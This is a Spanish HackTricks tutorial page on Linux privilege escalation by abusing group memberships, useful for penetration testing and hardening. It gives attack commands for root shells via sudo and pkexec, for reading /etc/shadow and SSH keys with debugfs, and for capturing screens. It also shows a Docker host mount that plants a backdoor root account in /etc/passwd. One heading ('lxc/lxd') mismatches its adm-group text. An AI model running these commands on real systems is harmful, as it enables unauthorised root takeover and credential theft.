# Grupos Interesantes - Escalada de Privilegios en Linux

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Equipos Rojos de AWS de HackTricks)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén el [**swag oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>

## Grupos de Sudo/Administrador

### **PE - Método 1**

**A veces**, **por defecto (o porque algún software lo necesita)** dentro del archivo **/etc/sudoers** puedes encontrar algunas de estas líneas:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Esto significa que **cualquier usuario que pertenezca al grupo sudo o admin puede ejecutar cualquier cosa como sudo**.

Si este es el caso, para **convertirse en root solo necesita ejecutar**:
```
sudo su
```
### PE - Método 2

Encuentra todos los binarios suid y verifica si está el binario **Pkexec**:
```bash
find / -perm -4000 2>/dev/null
```
Si descubres que el binario **pkexec es un binario SUID** y perteneces al grupo **sudo** o **admin**, probablemente podrías ejecutar binarios como sudo usando `pkexec`.\
Esto se debe a que normalmente esos son los grupos dentro de la **política polkit**. Esta política básicamente identifica qué grupos pueden usar `pkexec`. Verifícalo con:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Allí encontrarás qué grupos tienen permiso para ejecutar **pkexec** y **por defecto** en algunas distribuciones de Linux aparecen los grupos **sudo** y **admin**.

Para **convertirte en root puedes ejecutar**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
Si intentas ejecutar **pkexec** y obtienes este **error**:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**No es porque no tengas permisos, sino porque no estás conectado sin una GUI**. Y hay una solución alternativa para este problema aquí: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Necesitas **2 sesiones de ssh diferentes**:

{% code title="sesión1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
{% endcode %}

{% code title="sesion2" %}
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
{% endcode %}

## Grupo Wheel

**A veces**, **por defecto** dentro del archivo **/etc/sudoers** puedes encontrar esta línea:
```
%wheel	ALL=(ALL:ALL) ALL
```
Esto significa que **cualquier usuario que pertenezca al grupo wheel puede ejecutar cualquier cosa como sudo**.

Si este es el caso, para **convertirse en root solo tienes que ejecutar**:
```
sudo su
```
## Grupo Shadow

Los usuarios del **grupo shadow** pueden **leer** el archivo **/etc/shadow**:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
## Grupo de Disco

Este privilegio es casi **equivalente al acceso de root** ya que puedes acceder a todos los datos dentro de la máquina.

Archivos: `/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Ten en cuenta que usando debugfs también puedes **escribir archivos**. Por ejemplo, para copiar `/tmp/asd1.txt` a `/tmp/asd2.txt` puedes hacer:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Sin embargo, si intentas **escribir archivos propiedad de root** (como `/etc/shadow` o `/etc/passwd`) obtendrás un error de "**Permiso denegado**".

## Grupo de Video

Usando el comando `w` puedes encontrar **quién está conectado al sistema** y mostrará una salida como la siguiente:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
El grupo **tty1** significa que el usuario **yossi está conectado físicamente** a un terminal en la máquina.

El grupo **video** tiene acceso para ver la salida de la pantalla. Básicamente, puedes observar las pantallas. Para hacer eso, necesitas **capturar la imagen actual en la pantalla** en datos sin procesar y obtener la resolución que la pantalla está utilizando. Los datos de la pantalla se pueden guardar en `/dev/fb0` y podrías encontrar la resolución de esta pantalla en `/sys/class/graphics/fb0/virtual_size`.
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Para **abrir** la **imagen cruda** puedes usar **GIMP**, selecciona el archivo \*\*`screen.raw` \*\* y elige como tipo de archivo **Datos de imagen cruda**:

![](<../../../.gitbook/assets/image (287) (1).png>)

Luego modifica el Ancho y Alto a los utilizados en la pantalla y verifica diferentes Tipos de Imagen (y selecciona el que muestre mejor la pantalla):

![](<../../../.gitbook/assets/image (288).png>)

## Grupo Root

Parece que por defecto **los miembros del grupo root** podrían tener acceso para **modificar** algunos archivos de configuración de **servicios** o algunos archivos de **bibliotecas** u **otras cosas interesantes** que podrían ser utilizadas para escalar privilegios...

**Verifica qué archivos pueden modificar los miembros de root**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Grupo Docker

Puedes **montar el sistema de archivos raíz de la máquina anfitriona en el volumen de una instancia**, de modo que cuando la instancia se inicie, cargue inmediatamente un `chroot` en ese volumen. Esto te da efectivamente acceso de root en la máquina.
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
## Grupo lxc/lxd

Los **miembros** del grupo **`adm`** generalmente tienen permisos para **leer archivos de registro** ubicados dentro de _/var/log/_.\
Por lo tanto, si has comprometido a un usuario dentro de este grupo, definitivamente deberías echar un **vistazo a los registros**.

## Grupo Auth

Dentro de OpenBSD, el grupo **auth** generalmente puede escribir en las carpetas _**/etc/skey**_ y _**/var/db/yubikey**_ si se utilizan.\
Estos permisos pueden ser abusados con el siguiente exploit para **escalar privilegios** a root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
